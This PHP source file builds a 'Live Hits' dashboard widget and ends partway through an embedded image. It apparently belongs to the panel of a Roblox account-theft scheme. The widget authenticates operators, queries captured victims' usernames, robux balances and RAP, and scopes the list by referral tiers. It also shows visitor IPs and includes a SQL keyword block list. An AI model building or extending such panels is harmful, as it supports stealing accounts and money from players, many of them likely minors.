<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (empty($userData) || !is_array($userData) || (int)($userData['link_id'] ?? 0) <= 0) {
    $userData = function_exists('ultimaAuthenticatedRegular') ? ultimaAuthenticatedRegular() : null;
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}
if (!function_exists('dashWidgetQuery')) {
    function dashWidgetQuery($sql, $params = [], $ttl = 60) {
        if (function_exists('ultimaPageQuery')) {
            return ultimaPageQuery($sql, $params, $ttl);
        }
        if (function_exists('executeSafeQuery')) {
            return executeSafeQuery($sql, $params);
        }
        return [];
    }
}


$link_id = (int)$userData['link_id'];
$linkId = $link_id;
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;
$referredBy = (int)($userData['referred_by'] ?? 0);
$hasReferrer = $referredBy > 0;

$HITS_WINDOW = $hasReferrer ? 43200 : 1200;
$MAX_LIVE_ROWS = 6;
$initialHits = [];

try {
    $params = [];
    $scopeFilter = '';
    if ($isTriplehook) {
        if ($hasReferrer) {
            $scopeFilter = " AND h.link_id IN (SELECT r3.link_id FROM regular r3 WHERE r3.referred_by IN (SELECT td.link_id FROM triplehook_data td INNER JOIN regular r2 ON r2.link_id = td.link_id WHERE r2.referred_by = :referred_by))";
            $params[':referred_by'] = $referredBy;
        } else {
            $scopeFilter = " AND h.link_id IN (SELECT r3.link_id FROM regular r3 WHERE r3.referred_by IN (SELECT td.link_id FROM triplehook_data td))";
        }
        $sql = "SELECT h.id, h.username, h.avatar_url, h.robux, h.summary, h.rap, h.created_at,
                       r_owner.discord_username, r_owner.discord_avatar, r_owner.avatar_hidden,
                       UNIX_TIMESTAMP(h.created_at) AS created_ts
                FROM hits h
                LEFT JOIN regular r_hitter ON h.link_id = r_hitter.link_id
                LEFT JOIN regular r_owner ON r_hitter.referred_by = r_owner.link_id
                WHERE h.hidden = 0 $scopeFilter
                ORDER BY h.created_at DESC
                LIMIT $MAX_LIVE_ROWS";
    } else {
        if ($hasReferrer) {
            $scopeFilter = " AND h.link_id IN (SELECT r2.link_id FROM regular r2 WHERE r2.referred_by = :referred_by)";
            $params[':referred_by'] = $referredBy;
        }
        $sql = "SELECT h.id, h.username, h.avatar_url, h.robux, h.summary, h.rap, h.created_at,
                       r.discord_username, r.discord_avatar, r.avatar_hidden,
                       UNIX_TIMESTAMP(h.created_at) AS created_ts
                FROM hits h
                LEFT JOIN regular r ON h.link_id = r.link_id
                WHERE h.hidden = 0 $scopeFilter
                ORDER BY h.created_at DESC
                LIMIT $MAX_LIVE_ROWS";
    }
    $rows = dashWidgetQuery($sql, $params);
    if (is_array($rows) && $rows) {
        $nowRows = dashWidgetQuery('SELECT UNIX_TIMESTAMP() AS now_ts', []);
        $now = (int)(($nowRows[0]['now_ts'] ?? time()));
        $filtered = [];
        $prevTs = null;
        foreach ($rows as $h) {
            $ts = (int)($h['created_ts'] ?? 0);
            if ($ts === 0) break;
            if ($prevTs === null) {
                if (($now - $ts) > $HITS_WINDOW) break;
            } else {
                if (($prevTs - $ts) > $HITS_WINDOW) break;
            }
            unset($h['created_ts']);
            $filtered[] = $h;
            $prevTs = $ts;
            if (count($filtered) >= $MAX_LIVE_ROWS) break;
        }
        $initialHits = $filtered;
    }
} catch (\Throwable $e) {
    $initialHits = [];
}
?>
<style>
.live-hits-card{position:relative;overflow-x:auto;-webkit-overflow-scrolling:touch;display:flex;flex-direction:column;background:transparent;border:none;border-radius:0;padding:0;box-shadow:none;margin-left:0}
.live-hits-header{display:flex;align-items:center;justify-content:center;padding:16px 22px;border-bottom:1px solid rgba(255,255,255,0.06);position:sticky;left:0}
.live-hits-title{display:flex;flex-direction:column;align-items:center}
.live-hits-title h3{font-size:1.3rem;font-weight:700;color:#fff;letter-spacing:0.5px;margin:0;text-shadow:none;animation:lhFade .5s ease both}
.live-title-line{width:80px;height:2px;background:#fff;margin-top:8px;animation:lhFade .5s ease .1s both}
.live-switch-link{font-size:0.65rem;color:rgba(255,255,255,0.2);cursor:pointer;margin-top:6px;letter-spacing:0.5px;transition:all 0.3s ease;user-select:none;animation:lhFade .5s ease .2s both}
.live-switch-link:hover{color:rgba(255,255,255,0.5)}
@keyframes lhFade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
@keyframes lhRowSlide{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.live-hits-thead{display:grid;grid-template-columns:1.5fr 1fr 0.8fr 0.8fr 0.8fr 1.2fr;padding:12px 22px;border-bottom:1px solid rgba(255,255,255,0.04);min-width:650px}
.live-visits-thead{display:none;grid-template-columns:1.2fr 0.8fr 0.8fr 0.8fr 0.6fr;padding:12px 22px;border-bottom:1px solid rgba(255,255,255,0.04);min-width:650px}
.live-th{font-size:0.65rem;font-weight:500;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;gap:6px}
.live-th i{font-size:0.6rem;opacity:0.7}
.live-th .robux-icon{width:11px;height:11px;opacity:0.7}
.live-hits-tbody,.live-visits-tbody{flex:1;display:flex;flex-direction:column}
.live-visits-tbody{display:none}
.live-hit-row,.live-visit-row{display:grid;padding:12px 22px;border-bottom:1px solid rgba(255,255,255,0.03);transition:all 0.3s ease;min-width:650px}
.live-hit-row{grid-template-columns:1.5fr 1fr 0.8fr 0.8fr 0.8fr 1.2fr}
.live-visit-row{grid-template-columns:1.2fr 0.8fr 0.8fr 0.8fr 0.6fr}
.live-hit-row:last-child,.live-visit-row:last-child{border-bottom:none}
.live-hit-row:hover,.live-visit-row:hover{background:rgba(255,255,255,0.02)}
.live-hit-row.new-hit{animation:newHitGlow 0.6s ease}
.live-visit-row.new-visit{animation:newVisitGlow 0.6s ease}
@keyframes newHitGlow{
    0%{background:rgba(16,185,129,0.1);transform:translateX(5px)}
    100%{background:transparent;transform:translateX(0)}
}
@keyframes newVisitGlow{
    0%{background:rgba(74,144,226,0.1);transform:translateX(5px)}
    100%{background:transparent;transform:translateX(0)}
}
.live-td{display:flex;align-items:center;font-size:0.86rem;color:#fff;font-weight:600}
.user-cell,.hitter-cell{display:flex;align-items:center;gap:10px;min-width:0}
.user-mini-avatar{width:28px;height:28px;border-radius:50%;border:1px solid rgba(255,255,255,0.08);flex-shrink:0;object-fit:cover}
.live-hit-row:hover .user-mini-avatar,.live-visit-row:hover .user-mini-avatar{border-color:rgba(255,255,255,0.15)}
.user-cell span,.hitter-cell span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#fff;font-size:0.86rem;font-weight:600}.hitter-cell span{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;pointer-events:none}.hitter-cell span::after{content:attr(data-n)}
.special-message{font-size:0.9rem;color:rgba(255,255,255,0.5);font-weight:500}
.empty-state{display:flex;align-items:center;justify-content:center;padding:60px;color:rgba(255,255,255,0.25);font-size:0.95rem;flex:1}
.visit-ip{font-family:'Rajdhani',sans-serif;font-size:0.85rem;color:rgba(255,255,255,0.6);font-weight:500}
.visit-country{font-size:0.85rem;color:rgba(255,255,255,0.5)}
.visit-type{font-size:0.85rem;color:rgba(255,255,255,0.5);font-weight:500;text-transform:capitalize}
@media(max-width:768px){
    .live-hits-card{border-radius:0;margin-left:0}
    .live-hits-header{padding:14px 16px}
    .live-title-line{width:70px;margin-top:7px}
    .live-switch-link{font-size:0.6rem;margin-top:5px}
    .live-hits-thead,.live-visits-thead{padding:10px 16px;min-width:600px}
    .live-hit-row,.live-visit-row{padding:11px 16px;min-width:600px}
    .live-th{font-size:0.6rem;gap:5px;letter-spacing:0.8px}
    .live-th i{font-size:0.55rem}
    .live-th .robux-icon{width:10px;height:10px}
    .live-td{font-size:0.8rem}
    .user-mini-avatar{width:26px;height:26px}
    .user-cell span,.hitter-cell span{font-size:0.8rem}
    .user-cell,.hitter-cell{gap:8px}
    .special-message{font-size:0.78rem}
    .empty-state{padding:35px;font-size:0.85rem}
    .visit-ip{font-size:0.76rem}
    .visit-country,.visit-type{font-size:0.76rem}
}
@media(max-width:480px){
    .live-hits-card{border-radius:0}
    .live-hits-header{padding:12px 14px}
    .live-hits-title h3{font-size:1.1rem}
    .live-title-line{width:65px;height:1.5px;margin-top:6px}
    .live-switch-link{font-size:0.55rem;margin-top:4px}
    .live-hits-thead,.live-visits-thead{padding:9px 14px;min-width:560px}
    .live-hit-row,.live-visit-row{padding:10px 14px;min-width:560px}
    .live-th{font-size:0.55rem;gap:4px;letter-spacing:0.6px}
    .live-th i{font-size:0.5rem}
    .live-th .robux-icon{width:9px;height:9px}
    .live-td{font-size:0.75rem}
    .user-mini-avatar{width:24px;height:24px}
    .user-cell span,.hitter-cell span{font-size:0.75rem}
    .user-cell,.hitter-cell{gap:6px}
    .empty-state{padding:26px;font-size:0.8rem}
}
@media(max-width:360px){
    .live-hits-header{padding:10px 10px}
    .live-hits-title h3{font-size:1rem}
    .live-hits-thead,.live-visits-thead{padding:8px 10px;min-width:520px}
    .live-hit-row,.live-visit-row{padding:8px 10px;min-width:520px}
    .live-th{font-size:0.5rem}
    .live-td{font-size:0.7rem}
    .user-mini-avatar{width:22px;height:22px}
    .user-cell span,.hitter-cell span{font-size:0.7rem}
}
</style>
<div class="live-hits-card" id="live-hits-card">
    <div class="live-hits-header">
        <div class="live-hits-title">
            <h3 id="liveCardTitle">Live Hits</h3>
            <div class="live-title-line"></div>
            <span class="live-switch-link" id="liveSwitchLink" onclick="toggleLiveMode()">Click to switch to Live Visits(LOCAL)</span>
        </div>
    </div>

    <div class="live-hits-thead" id="liveHitsThead">
        <div class="live-th"><i class="fas fa-user"></i> User</div>
        <div class="live-th"><i class="fas fa-clock"></i> Time</div>
        <div class="live-th"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' width='32' height='32'%3E%3Cpath d='M15.0762 7.29574C15.6479 6.96571 16.3521 6.96571 16.9238 7.29574L23.0762 10.8479C23.6479 11.1779 24 11.7878 24 12.4479V19.5521C24 20.2122 23.6479 20.8221 23.0762 21.1521L16.9238 24.7043C16.3521 25.0343 15.6479 25.0343 15.0762 24.7043L8.92376 21.1521C8.35214 20.8221 8 20.2122 8 19.5521V12.4479C8 11.7878 8.35214 11.1779 8.92376 10.8479L15.0762 7.29574ZM11.9998 13V19C11.9998 19.5523 12.4475 20 12.9998 20H18.9998C19.5521 20 19.9998 19.5523 19.9998 19V13C19.9998 12.4477 19.5521 12 18.9998 12H12.9998C12.4475 12 11.9998 12.4477 11.9998 13Z' fill='rgba(255,255,255,0.4)'/%3E%3Cpath d='M13.8556 2.56068C15.1825 1.81311 16.8175 1.81311 18.1444 2.56068L26.8556 7.46819C28.1825 8.21577 29 9.59734 29 11.0925V20.9075C29 22.4027 28.1825 23.7842 26.8556 24.5318L18.1444 29.4393C16.8175 30.1869 15.1825 30.1869 13.8556 29.4393L5.14444 24.5318C3.81746 23.7842 3 22.4027 3 20.9075V11.0925C3 9.59734 3.81746 8.21577 5.14444 7.46819L13.8556 2.56068ZM17.1628 4.30319C16.4452 3.89894 15.5548 3.89894 14.8372 4.30319L6.12611 9.2107C5.41362 9.61209 5 10.336 5 11.0925V20.9075C5 21.664 5.41362 22.3879 6.12611 22.7893L14.8372 27.6968C15.5548 28.1011 16.4452 28.1011 17.1628 27.6968L25.8739 22.7893C26.5864 22.3879 27 21.664 27 20.9075V11.0925C27 10.336 26.5864 9.61209 25.8739 9.2107L17.1628 4.30319Z' fill='rgba(255,255,255,0.4)'/%3E%3C/svg%3E" class="robux-icon" alt=""> Balance</div>
        <div class="live-th"><i class="fas fa-chart-line"></i> Summary</div>
        <div class="live-th"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NjYiIGhlaWdodD0iMzc1Ij48cGF0aCBmaWxsPSIjNmY2ZjZmIiBkPSJNNzEuNyAxMzQuOWgzM2wxNy42LS4xIDE0OC40LS4yIDE1MS4xLS4xaDJsODEuNi0uMWgzMS44YzQgMCA1LjYuNSA4LjcgMyAxLjggMi4yIDMuMiA0LjEgNC41IDYuNmwxLjIgMi4yIDUuMiA5LjZxMy44IDYuOCA4IDEzLjRsNi44IDEwLjkgMS40IDIuMyA5LjMgMTUuNyA3LjcgMTIuN3EzLjggNi4xIDcuNCAxMi41IDIuMiAzLjYgNC41IDcuMWMxLjggMi45IDIuOCA1LjIgMy4xIDguNi0zLjMgMi4yLTQuMiAyLjItOCAyLjJINDIyLjZhNjIzNzkgNjIzNzkgMCAwIDEtMzU0LjItMWgtMy4yQzYzIDI0MCA2MyAyNDAgNjIgMjM5bC0uMS00di02Mi40TDYyIDEzNmMzLTEuNSA2LjMtMS4xIDkuNy0xLjEiLz48cGF0aCBmaWxsPSIjOGE4YThhIiBkPSJtMjYwIDE1MyAxLjcuMnExMS4yIDEuMiAyMi40LjloMy44bDkuMS0uMXYybDMuOC0xLjJjMi4yLS42IDIuMi0uNiA0LjItLjggMiAxLjQgMiAxLjQgMyAzbDItMmMyLjItLjQgMi4yLS40IDUtLjZsMy4xLS4yTDM0MSAxNTN2MmwxLjkuM2MyLjEuNyAyLjEuNyA0LjEgMy43IDAgNC0uMyA2LjItMyA5LjItNC4yIDIuNS03LjUgMi0xMi4zIDEuNmwtOC43LS44Yy0xIDMtMSAzIDAgNnEtLjQgNC0xIDhsMi41LTFjNC0xLjEgNy4xLTEgMTEuMy0uN2w0IC4yYzMuMi41IDMuMi41IDUuMiAyLjV2N2EzNCAzNCAwIDAgMS0xNi4yIDMuNmMtMy4yLjUtNC42IDEtNi44IDMuNC0uNSAzLS41IDMtLjIgNi4ydjMuM2wuMiAyLjVxOSAuMyAxNy45LTFjMi4xIDAgMi4xIDAgNS4xIDIgLjggMi43LjggNS4yIDEgOC0xIDEtMSAxLTQuMyAxLjFoLTE5LjNMMzEwIDIyMGMtMS0zLjEtMS4yLTUuNS0xLjMtOC44di0zLjVsLS4yLTMuNi0uMi03LjEtLjEtMy4yYy0uMS0yLjctLjEtMi43LS43LTQuOC0uNy0yLjgtLjYtNS40LS42LTguM3YtMTEuM2wuMS05LjRoLTJsLTEgN2MtOS40IDMuNC05LjQgMy40LTE0IDNhMTQ2IDE0NiAwIDAgMC00LjcgMzguNnYzLjJsLS4xIDIuOGMtLjIgMi40LS4yIDIuNC0xLjIgNS40aC04YTU1IDU1IDAgMCAxLTEuNS0xMi40bC0uMS0yLjUtMS0yMC40cS0uNS04LTEuNC0xNS43bC0zLS4yLTQtLjItMy44LS4zYy0zLjItLjMtMy4yLS4zLTQuMi0xLjMtMy0uMi01IDAtOCAxdjQ1bDQgMSAyIDF2NWMtMy4yIDMuMi03IDIuOS0xMS40IDMuM2wtMi43LjQtMi41LjItMi4zLjNjLTIuMS0uMi0yLjEtLjItMy44LTEuNS0xLjktMi41LTItNC43LTIuMy03LjdsMS0zaDJjMi44LTUuMiAzLjEtOS4yIDMtMTUuMmwtLjItMi4xLS4zLTExYzAtOC41IDAtOC41LTEuNS0xNi43bC0yLTEuOWMtMi0yLjEtMi0yLjEtMi4yLTUuOGwuMi0zLjNoMnYtMmgxMi41bDIuNi0uMWgyLjVxMy43LjMgNy40IDEuMWgzem00NSAyNSAyIDEtMiAxeiIvPjxwYXRoIGZpbGw9IiNlZWUiIGQ9Ik0zNTYgMTU4YzI3IDAgMjcgMCAzMCAxdjJsMS42LjJjMy42IDEuMiA1LjcgMy4yIDguNCA1Ljh2M2gyYTQyIDQyIDAgMCAxIDAgMzhoLTJsLS43IDEuOGMtMS43IDIuOC0zLjYgNC02LjMgNS45bC0yLjcgMS44QzM3Ni4yIDIyNCAzNzYgMjIwIDM1NiAyMjB6Ii8+PHBhdGggZmlsbD0iIzk2OTY5NiIgZD0ibTM0MCAxNTMgMSAyIDIgLjRjMiAuNiAyIC42IDQgMy42IDAgNC0uMyA2LjItMyA5LjItNC4yIDIuNS03LjUgMi0xMi4zIDEuNmwtOC43LS44Yy0xIDMtMSAzIDAgNnEtLjQgNC0xIDhsMi41LTFjNC0xLjEgNy4xLTEgMTEuMy0uN2w0IC4yYzMuMi41IDMuMi41IDUuMiAyLjV2N2EzNCAzNCAwIDAgMS0xNi4yIDMuNmMtMy4yLjUtNC42IDEtNi44IDMuNC0uNSAzLS41IDMtLjIgNi4ybC4yIDUuOHE5IC4zIDE3LjktMWMyLjEgMCAyLjEgMCA1LjEgMiAuOCAyLjcuOCA1LjIgMSA4LTEgMS0xIDEtNC4zIDEuMWgtMTkuM0wzMTAgMjIwYy0xLTMuMS0xLjItNS41LTEuMy04Ljh2LTMuNWwtLjItMy42LS4yLTcuMS0uMS0zLjJjLS4xLTIuNy0uMS0yLjctLjctNC44LS43LTIuOC0uNi01LjQtLjYtOC4zdi0xMS4zbC4xLTkuNGgtMmwtMSA3Yy05LjQgMy40LTkuNCAzLjQtMTQgMy00LjYgMTUuMy00LjUgMzEuMi01IDQ3aC0xdi01MmgxOHYtN2gtNDNjMi40LTIuNCAyLjgtMi4zIDYtMi4zaDIuNmwyLjctLjFoMi44bDE0LjgtLjMgMTguMS0uMyAyIDIgMi0yYzIuMi0uNCAyLjItLjQgNS0uNmwzLjItLjIgMy44LS4yIDIuMy0uMXptLTM1IDI1IDIgMS0yIDF6Ii8+PHBhdGggZmlsbD0iIzU4NTg1OCIgZD0iTTY4IDEzNC45aDEzNy41bDEwMS41LjF2MWgtMi42bC0zNSAuNWMtMjguOS4zLTI4LjkuMy01Ny44IDEtMjkuNSAxLTU5IC42LTg4LjYuNWwtMSAyLTItMS01LjctLjFIOTYuOGMtMi43IDAtMi43IDAtNSAuNi0yLjcuNy01LjIuMS04LS4yQTEzNiAxMzYgMCAwIDAgNjYgMTM5Yy0zIDQuNS0yLjMgOS0xLjUgMTQuMXEuNyA2IC42IDEyVjIwOUw2NSAyMzdoMTA0LjNsMTI4LjQuMXE2IC4xIDExLjktLjdsMy40LS40IDEgMXE2LjguNSAxMy40LjZsMy44LjJhOTkgOTkgMCAwIDAgMTUuOC0uM2M3LjktMSAxNS45LS4yIDIzLjguMiA1LjYuMiAxMS4xLjQgMTYuNy0uMiA5LjctMSAxOS40LS42IDI5LjEtLjVoMTQuOGwyLjUuMWgyLjNjMS45IDAgMS45IDAgMy44LTEuMWw1LjUgMXE1LjkgMS4xIDExLjkgMWMzLjktLjEgNyAuNSAxMC42IDJ2MWE1MjE4NSA1MjE4NSAwIDAgMS0zOTguNi0uOGgtMy43QzYzIDI0MCA2MyAyNDAgNjIgMjM5bC0uMS00di02Mi40TDYyIDEzNmMyLjMtMS4xIDMuNS0xLjEgNi0xLjEiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTYyIDE1OGgxM2wxLjggNS4zIDIuMyA3LjEgMS4zIDMuOHEzLjcgMTEuNCA4IDIyLjhjMS4xIDMuMyAxLjYgNS40IDEuNiA5IDIuNC0uOSAyLjQtLjkgMy4yLTQuMWwxLjItNGMyLjgtOC42IDIuOC04LjYgNC4yLTEycTEuOC00LjkgMy4zLTkuOGM1LTE1IDUtMTUgNy4xLTE3LjFoMTF2NjBoLTdsLTEtNTBjLTUuNiAxNS44LTUuNiAxNS44LTEwLjcgMzEuN2wtMS43IDUuMy0uOCAyLjVMMTk1IDIyMGgtN2wtNC41LTEwLjJxLTEuOC00LjQtMi45LTkuM2MtMi40LTEwLjEtNi0xOS44LTkuNi0yOS41bC0xIDQ5aC04eiIvPjxwYXRoIGZpbGw9IiM3ZjdmN2YiIGQ9Ik0yMTMuMyAxNTMuOGgyLjJxNC4zLjYgOC41IDIuMmwtLjEgMzl2My4zcS0uMiA2LjcuNyAxMy4zYy40IDMuNC40IDMuNC0xIDYuNC00IDMtNy43IDIuNC0xMi42IDItMS4yLTMuNy0xLjEtNy4xLTEuMS0xMWwuMS0yM2MtMi42IDMtMi42IDMtMyA3YTIwIDIwIDAgMCAxLTIgNi44IDM1IDM1IDAgMCAwLTIuNCA4Yy0yLjYgMTAuNS0yLjYgMTAuNS01LjYgMTQuMmExNCAxNCAwIDAgMS05LjggMS41Yy0zLTItMy4zLTQtNC4yLTcuNWwtMS4xLTMuNC0uOS0yLjZoLTFsLS4zLTEuOHEtMi0xMC4yLTQuNy0yMC4yYy0yLjcgNC0yLjIgOC4xLTIuMSAxMi44djIuNGwuMSA1LjhoMXYxMGEyMCAyMCAwIDAgMS0xMyAzYy0yLTMuNC0yLjItNi0yLjEtMTB2LTMuNmwuMS00IC4zLTE0LjUuMi0xMC44LjUtMjEuMWMzLjgtMiA2LjQtMi4yIDEwLjgtMi4xaDMuNWwyLjcuMXYyaDJjMi44IDUuMiAzLjggOS41IDQuNSAxNS4zIDAgMy41IDAgMy41IDEuNSA0Ljd2NmgzbDEgNS4zLjYgMi45Yy40IDIuOC40IDIuOC40IDYuOGgybC44LTNxMS4zLTQuMiAyLjgtOC40IDEuNC00LjQgMi05Yy40LTMuNi40LTMuNiAxLjQtNS42IDEuMS0yLjIgMS4yLTMuOCAxLjMtNi4zLjQtNS4zIDIuOC04LjMgNi43LTExLjcgMi4zLTEuMSAzLjctMS4yIDYuMy0xLjJNMTYyIDE1OHY2Mmg4bDEtNDkgNyAyMSAzIDggMS41IDZxMS44IDcuMyA1LjUgMTRoN3EzLTguNSA1LjYtMTdsLjctMi4yIDUuMS0xNS45LjctMnEyLjMtNyA0LjktMTMuOWwxIDUwaDd2LTYwYy0xMC4yLTEuMy0xMC4yLTEuMy0xMyAybC0xIDMtLjcgMS45YTE2OCAxNjggMCAwIDAtMy43IDExLjNsLS44IDIuNGMtNi40IDE5LjYtNi40IDE5LjYtOC44IDI1LjRsLTIgMS0uNC0yLjZhNjUgNjUgMCAwIDAtNC0xMy41bC0uNy0yLjItNS43LTE3LjEtMi40LTcuMi0xLjgtNS40eiIvPjxwYXRoIGZpbGw9IiM4MjgyODIiIGQ9Ik0zNjQgMTY1YzE3LjUgMCAxNy41IDAgMjMgNWwyLjQgMmMyLjggMy40IDMuOSA2LjEgMy45IDEwLjZ2OGMwIDQuOC0uNCA4LjgtMi4zIDEzLjRoLTJ2MmgtMmwtMSAzYy03LjggNS4zLTExLjQgNC0yMiA0eiIvPjxwYXRoIGZpbGw9IiNkYmRiZGIiIGQ9Ik0zMTEgMTU4aDMydjdoLTI0djE5aDIydjdoLTIydjIyaDI0djdoLTMyeiIvPjxwYXRoIGZpbGw9IiNlNmU2ZTYiIGQ9Ik0yNTkgMTU4aDQzdjdoLTE4djU1aC04di01NWgtMTd6Ii8+PHBhdGggZmlsbD0iIzhlOGU4ZSIgZD0ibTM2OSAxNTMgNy4zIDFxNS44LjkgMTEuNyAxdjJoM2MxLjUgMS40IDEuNSAxLjQgMyAzLjMgMi4yIDIuNyAyLjIgMi43IDQuNiA1LjEgMi4yIDIuNSAyLjYgNS41IDMuNSA4LjZsLjkgMiA0IDF2MTEuMXEuMyA2LjUtMSAxMi45bC0uMiAyLjZjLTEuMSAzLjQtMy4zIDUtNS44IDcuNGwtMSAyYy0yLjIgNC4zLTcuNSA2LjYtMTEuOCA4LjQtNiAxLjYtMTMuMiAyLjUtMTkuMi42bDEgNGgtNWwtMi0yaC00bC0xLTItMy0xYTk5IDk5IDAgMCAxLTEtMTguNnYtMzAuN2wuMS0zdi0yLjZjMC0yLjIgMC0yLjItMS4xLTQuMSAxLTMuNiAxLTMuNiAzLTcgNC4zLTEuMiA4LjUtMSAxMy0xem0tMTMgNXY2MmMyMCAyIDIwIDIgMzUuMi01LjJsMS44LTEuOCAxLjgtMS42YzEuNC0xLjMgMS40LTEuMyAxLjItMy40aDJjNC43LTkuOCA2LTIwLjggMy0zMS4zcS0xLjItMy40LTMtNi43aC0ybC0uMS0xLjdjLTEuNC0zLjYtMy45LTUuMS02LjktNy4zaC0zdi0yYy05LjUtMy4yLTIwLTEtMzAtMW0zNSA2MSAxIDItMi0xeiIvPjxwYXRoIGZpbGw9IiNlM2UzZTMiIGQ9Ik0yMzIgMTU4aDIydjVsLTcgMXY1MGw4IDF2NWgtMjN2LTVsNy0xdi01MGwtNy0xeiIvPjxwYXRoIGZpbGw9IiNkN2Q3ZDciIGQ9Ik0zNTYgMTU4YzI3IDAgMjcgMCAzMCAybC0yOS0xIC40IDguMy43IDEzLjdxMSAxNSAuOSAzMGwzLTEgMS00MmgxdjQ1YzEyLjMtLjQgMTIuMy0uNCAyMi01bDEtMmgydi0yaDJhNzggNzggMCAwIDAgMS4yLTE2di0yLjdBMzAgMzAgMCAwIDAgMzkwIDE3MmMtMS45LTEuMi0xLjktMS4yLTQtMmwtMy0zaDRsMSAyIDMgMWM0IDUuNSAzLjYgMTEuOCAzLjcgMTguNHYzLjRxLjIgNC4xLjMgOC4yaDNjMS44LTMgMi4yLTUuMiAyLjItOC44di01LjRsLS4xLTIuOS0uMS02LjljMi4yIDQgMi40IDcuNiAyLjQgMTJ2Mi4zQTQxIDQxIDAgMCAxIDM5OCAyMDhoLTJsLS43IDEuOGMtMS43IDIuOC0zLjYgNC02LjMgNS45bC0yLjcgMS44QzM3Ni4yIDIyNCAzNzYgMjIwIDM1NiAyMjB6Ii8+PHBhdGggZmlsbD0iI2QyZDJkMiIgZD0iTTEyOCAxNThoMjN2NWwtOCAxdjUwbDcgMSAxIDVoLTIzdi01bDctMSAxLTUwLTgtMXoiLz48cGF0aCBmaWxsPSIjZDBkMGQwIiBkPSJNOTIgMTU5aDd2NTRoMjR2N0g5MnoiLz48cGF0aCBmaWxsPSIjZGRkIiBkPSJNMjA5IDE1OWgxMXY2MGgtN2wtMS01MC02IDE3LTMgMWMtMS4yIDItMS4yIDItMiA0YTYzIDYzIDAgMCAxIDctMzF6Ii8+PHBhdGggZmlsbD0iIzg4OCIgZD0iTTIxMy4zIDE1My44aDIuMnE0LjMuNiA4LjUgMi4ybC0uMSAzOXYzLjNjMCA0LjUgMCA4LjguOSAxMy4ybC4yIDMuNS00IDR2LTYxaC0xM2wtMSA2LTEuMiA0LS44IDIuMi0yLjQgNy0uOCAyLjUtMi4yIDYuNXEtMy4xIDEwLjEtNy42IDE5LjhoLTJsLTEuMi0zLjgtMS44LTUuMy0xLTIuOC04LjUtMjQuNi0xLTIuOC0uOS0yLjVjLS42LTIuMi0uNi0yLjItLjYtNi4yaC0xM2MyLTIgMi0yIDUtMi4yaDMuNmwzLjYuMSAyLjguMXYyaDJjMi44IDUuMiAzLjggOS41IDQuNSAxNS4zIDAgMy41IDAgMy41IDEuNSA0Ljd2NmgzbDEgNS4zLjYgMi45Yy40IDIuOC40IDIuOC40IDYuOGgybC44LTNxMS4zLTQuMiAyLjgtOC40IDEuNC00LjQgMi05Yy40LTMuNi40LTMuNiAxLjQtNS42IDEuMS0yLjIgMS4yLTMuOCAxLjMtNi4zLjQtNS4zIDIuOC04LjMgNi43LTExLjcgMi4zLTEuMSAzLjctMS4yIDYuMy0xLjIiLz48cGF0aCBmaWxsPSIjNWE1YTVhIiBkPSJNNzAuNSAxMzQuOWgxMzQuOWwxMDEuNi4xdjFoLTIuNmwtMzUgLjVjLTI4LjkuMy0yOC45LjMtNTcuOCAxLTI5LjUgMS01OSAuNi04OC42LjVsLTEgMi0yLTEtNS43LS4xSDk2LjhjLTIuNyAwLTIuNyAwLTUgLjYtMi43LjctNS4yLjEtOC0uMmExMjcgMTI3IDAgMCAwLTE0LjUtLjVjLTMuNCAwLTMuNCAwLTYuMyAyLjJ2LTVjMi0yIDQuOS0xLjEgNy41LTEuMSIvPjxwYXRoIGZpbGw9IiM0ODQ4NDgiIGQ9Ik02MiAxMzZoMWwuNCA2IC4zIDMuNC44IDcuM3E